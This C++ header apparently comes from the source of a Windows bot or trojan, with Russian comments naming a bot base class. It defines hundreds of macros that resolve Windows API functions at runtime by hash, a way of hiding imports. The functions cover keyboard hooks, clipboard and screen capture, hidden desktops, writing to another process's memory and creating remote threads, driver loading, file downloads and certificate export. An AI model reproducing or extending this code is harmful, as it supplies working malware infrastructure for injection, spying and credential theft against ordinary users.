#define pAllocateAndInitializeSid	pushargEx< DLL_ADVAPI32, 0x28E9E291, 245 >
#define pCheckTokenMembership		pushargEx< DLL_ADVAPI32, 0x87FEDB50, 246 >
#define pFreeSid					pushargEx< DLL_ADVAPI32, 0x5CB5EF72, 247 >

//user32
#define pExitWindowsEx 				pushargEx< DLL_USER32, 0xAD7043A4, 248 >
#define pPeekMessageW 				pushargEx< DLL_USER32, 0xD7A87C3A, 249 >
#define pDispatchMessageW 			pushargEx< DLL_USER32, 0x4BAED1DE, 250 >
#define pMsgWaitForMultipleObjects 	pushargEx< DLL_USER32, 0xD36CEAF0, 251 >
#define pWaitForInputIdle			pushargEx< DLL_USER32, 0x4FAC81B4, 252 >
#define pGetWindowThreadProcessId	pushargEx< DLL_USER32, 0x6C7F716F, 253 >
#define pFindWindowA				pushargEx< DLL_USER32, 0x252B53B, 254 >
#define pGetSystemMetrics			pushargEx< DLL_USER32, 0x8EBEF5B1, 255 >
#define pGetActiveWindow			pushargEx< DLL_USER32, 0xDB7C98AC, 256 >
#define pGetKeyboardLayoutNameA		pushargEx< DLL_USER32, 0xEA0FAD78, 257 >
#define pOpenClipboard				pushargEx< DLL_USER32, 0x6ADFC795, 258 >
#define pGetClipboardData			pushargEx< DLL_USER32, 0x8E7AE818, 259 >
#define pCloseClipboard				pushargEx< DLL_USER32, 0xF0EC2212, 260 >
#define pGetWindowTextA				pushargEx< DLL_USER32, 0x9C29100A, 261 >
#define pGetWindowTextW				pushargEx< DLL_USER32, 0x9C29101C, 262 >
#define pGetForegroundWindow		pushargEx< DLL_USER32, 0xCACD450, 263 >
#define pGetWindowLongPtrA			pushargEx< DLL_USER32, 0x1D6C998B, 264 >
#define pGetWindowLongPtrW			pushargEx< DLL_USER32, 0x1D6C999D, 265 >
#define pEnumChildWindows			pushargEx< DLL_USER32, 0xAE8A5532, 266 >
#define pGetParent					pushargEx< DLL_USER32, 0x5992A5F2, 267 >
#define pGetDesktopWindow			pushargEx< DLL_USER32, 0xCD4AC62B, 268 >
#define pIsWindowVisible			pushargEx< DLL_USER32, 0xCFAAD7BF, 269 >
#define pIsWindowUnicode            pushargEx< DLL_USER32, 0x6EE99F86, 270 >
#define pSetWindowLongA				pushargEx< DLL_USER32, 0xBD6C998B, 271 >
#define pSetWindowLongW				pushargEx< DLL_USER32, 0xBD6C999D, 272 >
#define pGetWindowLongA				pushargEx< DLL_USER32, 0x1D6C998B, 273 >
#define pGetWindowLongW				pushargEx< DLL_USER32, 0x1D6C999D, 274 >
#define pSetLayeredWindowAttributes	pushargEx< DLL_USER32, 0x2DDBD2AF, 275 >
#define pSetWindowPos				pushargEx< DLL_USER32, 0xA92DF5AF, 276 >
#define pMessageBoxA				pushargEx< DLL_USER32, 0xABBC680D, 277 >
#define pMessageBoxW				pushargEx< DLL_USER32, 0xABBC681B, 278 >
#define pGetClassNameW				pushargEx< DLL_USER32, 0x484006A, 279 >
#define pGetClassNameA				pushargEx< DLL_USER32, 0x484007C, 280 >
#define pShowWindow					pushargEx< DLL_USER32, 0x7506E960, 281 >
#define pSendMessageW				pushargEx< DLL_USER32, 0x58A81C3F, 282 >
#define pSendMessageA				pushargEx< DLL_USER32, 0x58A81C29, 283 >
#define pEnumWindows				pushargEx< DLL_USER32, 0x9940B5CA, 284 >
#define pIsWindow					pushargEx< DLL_USER32, 0x9D4AF949, 285 >
#define pGetWindow					pushargEx< DLL_USER32, 0xDA12E549, 286 >
#define pCreateDesktopW				pushargEx< DLL_USER32, 0xC43ED7B1, 287 >
#define pCreateDesktopA				pushargEx< DLL_USER32, 0xC43ED7A7, 288 >
#define pGetThreadDesktop			pushargEx< DLL_USER32, 0x79F9B7FA, 289 >
#define pSwitchDesktop				pushargEx< DLL_USER32, 0x5B92DEA5, 290 >
#define pSetThreadDesktop			pushargEx< DLL_USER32, 0x79F99FFA, 291 >
#define pGetTopWindow				pushargEx< DLL_USER32, 0xC90E0C33, 292 >
#define pMoveWindow					pushargEx< DLL_USER32, 0x7234A16F, 293 >
#define pFindWindowExA				pushargEx< DLL_USER32, 0xAD4FFCD5, 294 >
#define pGetMessageA				pushargEx< DLL_USER32, 0xC8A274AC, 295 >
#define pSendMessageTimeoutW		pushargEx< DLL_USER32, 0x65846C69, 296 >
#define pSendMessageTimeoutA 		pushargEx< DLL_USER32, 0x65846C7F, 297 >
#define pSetClipboardViewer			pushargEx< DLL_USER32, 0x322391FC, 298 >
#define pIsClipboardFormatAvailable	pushargEx< DLL_USER32, 0xB161BF96, 299 >
#define pChangeClipboardChain   	pushargEx< DLL_USER32, 0x7CF84417, 300 >
#define pPostMessageA				pushargEx< DLL_USER32, 0xC8A87EA7, 301 >
#define pGetMessagePos 				pushargEx< DLL_USER32, 0x9D2F45DB, 302 >
#define pClientToScreen 			pushargEx< DLL_USER32, 0x543DF505, 303 >
#define pGetWindowRect  			pushargEx< DLL_USER32, 0x97F85FA0, 304 >
#define pDefWindowProcA 			pushargEx< DLL_USER32, 0xC6CE9B8A, 305 >
#define pCallWindowProcA 			pushargEx< DLL_USER32, 0xEE5FDA87, 306 >
#define pGetKeyNameTextW 			pushargEx< DLL_USER32, 0xAD34F519, 307 >
#define pGetKeyboardState			pushargEx< DLL_USER32, 0xF5E780A6, 308 >
#define pGetKeyboardLayout			pushargEx< DLL_USER32, 0xA0C69BF7, 309 >
#define pToUnicodeEx    			pushargEx< DLL_USER32, 0x2944D0D1, 310 >
#define pLoadCursorW    			pushargEx< DLL_USER32, 0xCFB2E5CF, 311 >
#define pLoadCursorA    			pushargEx< DLL_USER32, 0xCFB2E5D9, 312 >
#define pRegisterClassA    			pushargEx< DLL_USER32, 0xAEABC9A4, 313 >
#define pCreateWindowExA   			pushargEx< DLL_USER32, 0xBF7EFB5A, 314 >
#define pTranslateMessage   		pushargEx< DLL_USER32, 0xC45D9631, 315 >
#define pDispatchMessageA   		pushargEx< DLL_USER32, 0x4BAED1C8, 316 >
#define pGetWindowDC   				pushargEx< DLL_USER32, 0xB95254C7, 317 >
#define pReleaseDC					pushargEx< DLL_USER32, 0x4CB2D16D, 318 >
#define pFillRect					pushargEx< DLL_USER32, 0xCAD4D692, 319 >
#define pCallWindowProcW			pushargEx< DLL_USER32, 0xEE5FDA91, 320 >
#define pSetTimer       			pushargEx< DLL_USER32, 0x4D9CE557, 321 >
#define pDestroyWindow      		pushargEx< DLL_USER32, 0xEB4A6DB3, 322 >
#define pGetFocus           		pushargEx< DLL_USER32, 0x6D776D57, 323 >
#define pCharLowerBuffA        		pushargEx< DLL_USER32, 0x5FDA1871, 324 >
#define pCharUpperBuffA        		pushargEx< DLL_USER32, 0xC0D4187D, 325 >
#define pwvsprintfA 				pushargEx< DLL_USER32, 0x6B3AF0EC, 326 >
#define pwvsprintfW 				pushargEx< DLL_USER32, 0x6B3AF0FA, 327 >
#define pSetWindowsHookExA 			pushargEx< DLL_USER32, 0xB4584DDA, 328 >
#define pSetWindowsHookExW 			pushargEx< DLL_USER32, 0xB4584DCC, 329 >
#define pUnhookWindowsHookEx 		pushargEx< DLL_USER32, 0xB800C8A6, 330 >
#define pSetWindowTextA 			pushargEx< DLL_USER32, 0x3C29100A, 331 >
#define pSetWindowTextW 			pushargEx< DLL_USER32, 0x3C29101C, 332 >
#define pSetWindowLongPtrA			pushargEx< DLL_USER32, 0x334A94D2, 333 >
#define pSetWindowLongPtrW			pushargEx< DLL_USER32, 0x334A94C4, 334 >
#define pScreenToClient				pushargEx< DLL_USER32, 0xBDAE901A, 335 >
#define pGetClientRect				pushargEx< DLL_USER32, 0xA2F65BA2, 336 >
#define pGetDlgItem					pushargEx< DLL_USER32, 0x9CD421A8, 337 >
#define pCallNextHookEx				pushargEx< DLL_USER32, 0x8616AB9B, 338 >
#define pGetCursor					pushargEx< DLL_USER32, 0x199725ED, 339 >
#define pSetCursor					pushargEx< DLL_USER32, 0xD9725ED, 340 >
#define pGetAncestor			 	pushargEx< DLL_USER32, 0xAAFE9D1E, 341 >
#define pRegisterWindowMessageA	 	pushargEx< DLL_USER32, 0xE5D2B59, 342 >
#define pGetDC			        	pushargEx< DLL_USER32, 0x7CBD2247, 343 >
#define pGetClassLongA	        	pushargEx< DLL_USER32, 0x2544C17C, 344 >
#define pPrintWindow	        	pushargEx< DLL_USER32, 0xF404F170, 345 >
#define pGetWindowPlacement	       	pushargEx< DLL_USER32, 0xE06982CE, 346 >
#define pIsIconic			       	pushargEx< DLL_USER32, 0x3D687AAD, 347 >
#define pSetFocus			       	pushargEx< DLL_USER32, 0x6D5F6D57, 348 >
#define pSetActiveWindow			pushargEx< DLL_USER32, 0xDB7C98FC, 349 >
#define pSetCursorPos				pushargEx< DLL_USER32, 0xBDB58517, 350 >
#define pAttachThreadInput			pushargEx< DLL_USER32, 0xE16B4137, 351 >
#define pUpdateWindow				pushargEx< DLL_USER32, 0xFC3A1D7B, 352 >
#define pDestroyMenu				pushargEx< DLL_USER32, 0x6A50AD38, 353 >
#define pmouse_event				pushargEx< DLL_USER32, 0xAB3EFAFD, 354 >
#define pSetCapture					pushargEx< DLL_USER32, 0xEB747643, 355 >
#define pReleaseCapture				pushargEx< DLL_USER32, 0x6B0BEF18, 356 >
#define pBlockInput					pushargEx< DLL_USER32, 0xF103B589, 357 >

//winsock
#define pWSACleanup 				pushargEx< DLL_WINSOCK, 0x8FB8B5BD, 358 >
#define pWSAStartup 				pushargEx< DLL_WINSOCK, 0xCDDE757D, 359 >
#define psocket 					pushargEx< DLL_WINSOCK, 0xFC7AF16A, 360 >
#define pclosesocket 				pushargEx< DLL_WINSOCK, 0x939D7D9C, 361 >
#define paccept 					pushargEx< DLL_WINSOCK, 0x3C797B7A, 362 >
#define pbind 						pushargEx< DLL_WINSOCK, 0xC5A7764, 363 >
#define phtons 						pushargEx< DLL_WINSOCK, 0x8E9BF775, 364 >
#define plisten 					pushargEx< DLL_WINSOCK, 0x9E7D3188, 365 >
#define precv 						pushargEx< DLL_WINSOCK, 0xE5971F6, 366 >
#define psend 						pushargEx< DLL_WINSOCK, 0xE797764, 367 >
#define pconnect 					pushargEx< DLL_WINSOCK, 0xEDD8FE8A, 368 >
#define pshutdown 					pushargEx< DLL_WINSOCK, 0x4C7C5841, 369 >
#define pgethostbyname 				pushargEx< DLL_WINSOCK, 0xF44318C6, 370 >
#define pgethostbyaddr 				pushargEx< DLL_WINSOCK, 0xF5A25C51, 371 >
#define pinet_addr 					pushargEx< DLL_WINSOCK, 0x95E4A5D7, 372 >
#define pinet_ntoa 					pushargEx< DLL_WINSOCK, 0x9400A044, 373 >
#define pgetaddrinfo				pushargEx< DLL_WINSOCK, 0xD9F839BA, 374 >
#define pgetpeername				pushargEx< DLL_WINSOCK, 0xD939F838, 375 >
#define pselect						pushargEx< DLL_WINSOCK, 0x5D99726A, 376 >
#define psetsockopt					pushargEx< DLL_WINSOCK, 0xD8923733, 377 >
#define pWSAGetLastError			pushargEx< DLL_WINSOCK, 0x8E878072, 378 >
#define pWSASetLastError			pushargEx< DLL_WINSOCK, 0x8E850072, 379 >
#define pioctlsocket		     	pushargEx< DLL_WINSOCK, 0x1F935B1D, 380 >
#define pWSAFDIsSet   		     	pushargEx< DLL_WINSOCK, 0x4DFC1F3B, 381 >

//ntdll
#define pRtlInitUnicodeString 		pushargEx< DLL_NTDLL, 0x3287EC73, 382 >
#define pRtlInitAnsiString			pushargEx< DLL_NTDLL, 0xEE02056A, 383 >
#define pNtOpenFile 				pushargEx< DLL_NTDLL, 0x9C45B56C, 384 >
#define pNtOpenDirectoryObject 		pushargEx< DLL_NTDLL, 0xF5F11CF0, 385 >
#define pNtCreateSection 			pushargEx< DLL_NTDLL, 0x6E6F608B, 386 >
#define pNtOpenSection 				pushargEx< DLL_NTDLL, 0x5FA9AB38, 387 >
#define pZwLoadDriver 				pushargEx< DLL_NTDLL, 0x42F57D33, 388 >
#define pZwUnloadDriver 			pushargEx< DLL_NTDLL, 0x95849B61, 389 >
#define pRtlAdjustPrivilege 		pushargEx< DLL_NTDLL, 0xC2A6B1AE, 390 >
#define pZwMakeTemporaryObject 		pushargEx< DLL_NTDLL, 0x128CE9D3, 391 >
#define pNtClose 					pushargEx< DLL_NTDLL, 0x3D9AC241, 392 >
#define pRtlImageNtHeader			pushargEx< DLL_NTDLL, 0xDD39FD14, 393 >
#define pZwQuerySystemInformation	pushargEx< DLL_NTDLL, 0xBC44A131, 394 >
#define pZwUnmapViewOfSection		pushargEx< DLL_NTDLL, 0x9ED4D161, 395 >
#define pZwMapViewOfSection			pushargEx< DLL_NTDLL, 0x594D9A3C, 396 >
#define pZwQueueApcThread			pushargEx< DLL_NTDLL, 0xC0E4F6EE, 397 >
#define pZwResumeThread				pushargEx< DLL_NTDLL, 0xACF8BF39, 398 >
#define pZwTestAlert				pushargEx< DLL_NTDLL, 0xC952A06B, 399 >
#define pZwQueryInformationThread	pushargEx< DLL_NTDLL, 0xFAEDF3AA, 400 >
#define pZwOpenProcess				pushargEx< DLL_NTDLL, 0x9C0AC99D, 401 >
#define pZwOpenProcessToken			pushargEx< DLL_NTDLL, 0xADACBE07, 402 >
#define pZwClose					pushargEx< DLL_NTDLL, 0x3D9A9259, 403 >
#define pZwAllocateVirtualMemory	pushargEx< DLL_NTDLL, 0x594AA9E4, 404 >
#define pZwFreeVirtualMemory		pushargEx< DLL_NTDLL, 0xBED3922C, 405 >
#define pZwWriteVirtualMemory		pushargEx< DLL_NTDLL, 0xEEE7AF23, 406 >
#define pZwProtectVirtualMemory		pushargEx< DLL_NTDLL, 0x3836C63E, 407 >
#define pRtlCreateUserThread		pushargEx< DLL_NTDLL, 0xE9E0A4F7, 408 >
#define pLdrLoadDll					pushargEx< DLL_NTDLL, 0x78740534, 409 >
#define pLdrGetDllHandle			pushargEx< DLL_NTDLL, 0x7E287C6A, 410 >
#define pLdrGetProcedureAddress		pushargEx< DLL_NTDLL, 0x323C2875, 411 >
#define pZwSetContextThread			pushargEx< DLL_NTDLL, 0x62E2FE6F, 412 >
#define pZwSetInformationProcess	pushargEx< DLL_NTDLL, 0xCA2BF652, 413 >
#define pZwQueryInformationProcess	pushargEx< DLL_NTDLL, 0xA638CE5F, 414 >
#define pRtlImageDirectoryEntryToData pushargEx< DLL_NTDLL, 0x503f7b28, 415 >
#define pZwQueryInformationFile		pushargEx< DLL_NTDLL, 0x0f7ba4b7, 416 >
#define pZwShutdownSystem			pushargEx< DLL_NTDLL, 0x6F1C809E, 417 >
#define pRtlComputeCrc32			pushargEx< DLL_NTDLL,0x687B7023, 418 >



//winsta
#define pWinStationTerminateProcess	pushargEx< DLL_WINSTA, 0xA60C5F05, 419 >

//shell32
#define pSHGetSpecialFolderPathA 	pushargEx< DLL_SHELL32, 0xC95D8550, 420 >
#define pSHGetSpecialFolderPathW 	pushargEx< DLL_SHELL32, 0xC95D8546, 421 >
#define pFindExecutableA			pushargEx< DLL_SHELL32, 0x37707500, 422 >
#define pFindExecutableW			pushargEx< DLL_SHELL32, 0x37707516, 423 >
#define pSHGetFolderPathA			pushargEx< DLL_SHELL32, 0xDEAA9541, 424 >
#define pSHGetFolderPathW			pushargEx< DLL_SHELL32, 0xDEAA9557, 425 >
#define pShellExecuteW				pushargEx< DLL_SHELL32, 0x570BC88F, 426 >
#define pShellExecuteA				pushargEx< DLL_SHELL32, 0x570BC899, 427 >
#define pStrStrIW 					pushargEx< DLL_SHELL32, 0x3E3B7742, 428 > //	PTSTR StrStrI(PTSTR pszFirst,PCTSTR pszSrch);
#define pStrStrIA 					pushargEx< DLL_SHELL32, 0x3E3B7754, 429 >
#define pShellExecuteExA			pushargEx< DLL_SHELL32, 0xf2276983, 430 >
#define pShellExecuteExW			pushargEx< DLL_SHELL32, 0xf2276995, 431 >
#define pSHFileOperationA			pushargEx< DLL_SHELL32, 0x8B6D020B, 432 >
#define pSHFileOperationW			pushargEx< DLL_SHELL32, 0x8B6D021D, 433 >



//wininet
#define pInternetConnectA 			pushargEx< DLL_WININET, 0xBE618D3E, 434 >
#define pInternetConnectW 			pushargEx< DLL_WININET, 0xBE618D28, 435 >
#define pHttpOpenRequestA 			pushargEx< DLL_WININET, 0x1510002F, 436 >
#define pHttpOpenRequestW 			pushargEx< DLL_WININET, 0x15100039, 437 >
#define pHttpSendRequestA 			pushargEx< DLL_WININET, 0x9F13856A, 438 >
#define pHttpSendRequestW 			pushargEx< DLL_WININET, 0x9F13857C, 439 >
#define pInternetCloseHandle 		pushargEx< DLL_WININET, 0x7314FB0C, 440 >
#define pInternetQueryOptionA 		pushargEx< DLL_WININET, 0x2AE71934, 441 >
#define pInternetQueryOptionW 		pushargEx< DLL_WININET, 0x2AE71922, 442 >
#define pInternetSetOptionA 		pushargEx< DLL_WININET, 0x1AD09C78, 443 >
#define pInternetSetStatusCallback 	pushargEx< DLL_WININET, 0x9EF6461, 444 >
#define pHttpQueryInfoA 			pushargEx< DLL_WININET, 0x2F5CE027, 445 >
#define pHttpQueryInfoW 			pushargEx< DLL_WININET, 0x2F5CE031, 446 >
#define pHttpAddRequestHeadersA		pushargEx< DLL_WININET, 0xB5901061, 447 >
#define pHttpAddRequestHeadersW		pushargEx< DLL_WININET, 0xB5901077, 448 >
#define pGetUrlCacheEntryInfoW 		pushargEx< DLL_WININET, 0x57FBC0CB, 449 >
#define pGetUrlCacheEntryInfoA 		pushargEx< DLL_WININET, 0x57FBC0DD, 450 >
#define pFindFirstUrlCacheEntryA	pushargEx< DLL_WININET, 0xDDCB15D, 451 >
#define pFindNextUrlCacheEntryA		pushargEx< DLL_WININET, 0x8733D614, 452 >
#define pDeleteUrlCacheEntry		pushargEx< DLL_WININET, 0xA3A80AB6, 453 >
#define pFindCloseUrlCache			pushargEx< DLL_WININET, 0xFDE87743, 454 >
#define pInternetOpenA				pushargEx< DLL_WININET, 0x8593DD7, 455 >
#define pInternetOpenUrlA			pushargEx< DLL_WININET, 0xB87DBD66, 456 >
#define pInternetReadFile			pushargEx< DLL_WININET, 0x1A212962, 457 >
#define pInternetReadFileExA		pushargEx< DLL_WININET, 0x2C523864, 458 >
#define pInternetReadFileExW		pushargEx< DLL_WININET, 0x2C523872, 459 >
#define pReadUrlCacheEntryStream	pushargEx< DLL_WININET, 0x1672BC16, 460 >
#define pUnlockUrlCacheEntryStream	pushargEx< DLL_WININET, 0xEE22C82A, 461 >
#define pRetrieveUrlCacheEntryStreamA	pushargEx< DLL_WININET, 0x609C6936, 462 >
#define pFindFirstUrlCacheEntryExA  pushargEx< DLL_WININET, 0x2C567F36, 463 >
#define pFindNextUrlCacheEntryExA	pushargEx< DLL_WININET, 0xF5841D8D, 464 >
#define pDeleteUrlCacheEntryA		pushargEx< DLL_WININET, 0xD4055B10, 465 >
#define pCreateUrlCacheEntryA		pushargEx< DLL_WININET, 0x10815BF5, 466 >
#define pCommitUrlCacheEntryA		pushargEx< DLL_WININET, 0x548D61B6, 467 >


//urlmon
#define pURLDownloadToFileA			pushargEx< DLL_URLMON, 0xD95D2399, 468 >
#define pURLDownloadToFileW			pushargEx< DLL_URLMON, 0xD95D238F, 469 >
#define pObtainUserAgentString		pushargEx< DLL_URLMON, 0x534D481, 470 >


/* gdi32.dll */
#define pCreateCompatibleBitmap		  pushargEx< DLL_GDI, 0x6B3470D5, 471 >
#define pCreateCompatibleDC		      pushargEx< DLL_GDI, 0x5AF0017C, 472 >
#define pSelectObject       	      pushargEx< DLL_GDI, 0x4894DAFC, 473 >
#define pBitBlt             	      pushargEx< DLL_GDI, 0x9E90B462, 474 >
#define pDeleteDC            	      pushargEx< DLL_GDI, 0x5E10F525, 475 >
#define pDeleteObject           	  pushargEx< DLL_GDI, 0x48B87EFC, 476 >
#define pGetDeviceCaps           	  pushargEx< DLL_GDI, 0x39E9624F, 477 >
#define pCreateSolidBrush             pushargEx< DLL_GDI, 0xEF9AC06E, 478 >


/* gdiplus.dll */
#define pGdiplusStartup		          pushargEx< DLL_GDIPLUS, 0x55F74962, 479 >
#define pGdipCreateBitmapFromHBITMAP  pushargEx< DLL_GDIPLUS, 0xB7F0B572, 480 >
#define pGdipSaveImageToFile		  pushargEx< DLL_GDIPLUS, 0xE410B3EB, 481 >
#define pGdipDisposeImage	          pushargEx< DLL_GDIPLUS, 0x226FA923, 482 >
#define pGdiplusShutdown		      pushargEx< DLL_GDIPLUS, 0x99A24264, 483 >


//crypt32
#define pCertOpenSystemStoreA				pushargEx< DLL_CRYPT32, 0xEEA9ED9D, 484 >
#define pCertEnumCertificatesInStore		pushargEx< DLL_CRYPT32, 0x9897E094, 485 >
#define pPFXExportCertStoreEx				pushargEx< DLL_CRYPT32, 0xDFDB467E, 486 >
#define pCertCloseStore						pushargEx< DLL_CRYPT32, 0xCC1A6B6B, 487 >
#define pPFXImportCertStore					pushargEx< DLL_CRYPT32, 0x3A1B7F5D, 488 >
#define pCertAddCertificateContextToStore	pushargEx< DLL_CRYPT32, 0xDC6DD6E5, 489 >
#define pCertDuplicateCertificateContext	pushargEx< DLL_CRYPT32, 0x2F16F47, 490 >
#define pCertDeleteCertificateFromStore		pushargEx< DLL_CRYPT32, 0x5B08B5F, 491 >



//
//psapi.dll
#define	pGetMappedFileNameA			pushargEx< DLL_PSAPI, 0x860331a8, 492 >
#define pEnumProcessModules			pushargEx< DLL_PSAPI, 0x189F16C9, 493 >
#define pGetModuleBaseNameA			pushargEx< DLL_PSAPI, 0x7353EFE8, 494 >
#define pGetModuleFileNameExA		pushargEx< DLL_PSAPI, 0xE4FB2191, 495 >

#define pGetProcessImageFileNameA	pushargEx<DLL_PSAPI, 0x2741105, 496 >


//
//shlwapi.dll
#define	pPathFindFileNameA			pushargEx< DLL_SHLWAPI, 0xeed5398c, 497 >
#define pPathFindFileNameW			pushargEx< DLL_SHLWAPI, 0xEED5399A, 498 >
#define pPathCombineA				pushargEx< DLL_SHLWAPI, 0x45B615D5, 499 >
#define pPathCombineW				pushargEx< DLL_SHLWAPI, 0x45b615c3, 500 >
#define pStrStrA					pushargEx< DLL_SHLWAPI, 0x2A7C76E6, 501 >
#define pPathRemoveFileSpecA		pushargEx< DLL_SHLWAPI, 0xE6E3EE01, 502 >
#define pStrToIntA					pushargEx< DLL_SHLWAPI, 0xAAD270E7, 503 >
#define pStrToInt64ExA				pushargEx< DLL_SHLWAPI, 0xC3C5B48, 504 >
#define pPathAppendA				pushargEx< DLL_SHLWAPI, 0xF86AA1F6, 505 >
#define pPathAppendW				pushargEx< DLL_SHLWAPI, 0xF86AA1E0, 506 >
#define pPathIsDirectoryEmptyA		pushargEx< DLL_SHLWAPI, 0xCA98893B, 507 >


//Iphlpapi.dll
#define	pGetIpNetTable				pushargEx< DLL_IPHLPAPI, 0xB8D99CE4, 508 >
#define	pGetAdaptersInfo			pushargEx< DLL_IPHLPAPI, 0xE69A1CD7, 509 >



//odbc32
#define pSQLAllocHandle				pushargEx< DLL_ODBC32, 0xEC1F2857, 510 >
#define pSQLSetEnvAttr				pushargEx< DLL_ODBC32, 0x88EE1E2C, 511 >
#define pSQLConnectA				pushargEx< DLL_ODBC32, 0x203F51DF, 512 >
#define pSQLDriverConnectA			pushargEx< DLL_ODBC32, 0x3941DBB7, 513 >
#define pSQLPrepareA				pushargEx< DLL_ODBC32, 0xC09D6D06, 514 >
#define pSQLBindCol					pushargEx< DLL_ODBC32, 0x3D09FC8B, 515 >
#define pSQLExecute					pushargEx< DLL_ODBC32, 0x8DE46D8A, 516 >
#define pSQLFetch					pushargEx< DLL_ODBC32, 0x6C1A778C, 517 >
#define pSQLCloseCursor				pushargEx< DLL_ODBC32, 0xACA2F119, 518 >
#define pSQLFreeHandle				pushargEx< DLL_ODBC32, 0x6A289300, 519 >
#define pSQLDisconnect				pushargEx< DLL_ODBC32, 0x8104CDA8, 520 >
#define pSQLBindParameter			pushargEx< DLL_ODBC32, 0xE8536508, 521 >
#define pSQLGetDiagRecA				pushargEx< DLL_ODBC32, 0x13C9473F, 522 >

//version.dll
#define pGetFileVersionInfoSizeA	pushargEx< DLL_VERSION, 0x8A94F707, 523 >
#define pGetFileVersionInfoA		pushargEx< DLL_VERSION, 0x7AA45C7A, 524 >
#define pVerQueryValueA				pushargEx< DLL_VERSION, 0x4E26C00F, 525 >

// ole32.dll
#define pCoCreateGuid				pushargEx< DLL_OLE32, 0xAA3E88A3, 526 >
#define pCoInitializeEx				pushargEx<DLL_OLE32, 0x7573DE28, 527 >
#define pCoUninitialize				pushargEx<DLL_OLE32, 0xEDB3159D, 528 >
#define pCoCreateInstance			pushargEx<DLL_OLE32, 0x368435BE, 529 >
#define pCoInitializeSecurity		pushargEx<DLL_OLE32, 0x910EACB3, 530 >

//winspool.drv
#define pAddPrintProvidorA			pushargEx<DLL_WINSPOOL, 0x4B12B4DF, 531 >
#define pDeletePrintProvidorA		pushargEx<DLL_WINSPOOL, 0x3D369C42, 532 >

//imagehlp
#define pCheckSumMappedFile			pushargEx<DLL_IMAGEHLP, 0xd5edc5a2, 533 >

//****************************************************************
//  Вспомогательные функции
//****************************************************************

#define Min(a,b) (((a) < (b)) ? (a) : (b))
#define Max(a,b) (((a) > (b)) ? (a) : (b))


//****************************************************************
//  TBotClass - базовый класс бота
//****************************************************************


class TBotObject
{
public:
	virtual ~TBotObject() {}

	void* operator new(size_t size);
	void* operator new[](size_t size);
	void  operator delete(void* Pointer);
	void  operator delete[](void* Pointer);
};


//----------------------------------------------------------------------------
#endif
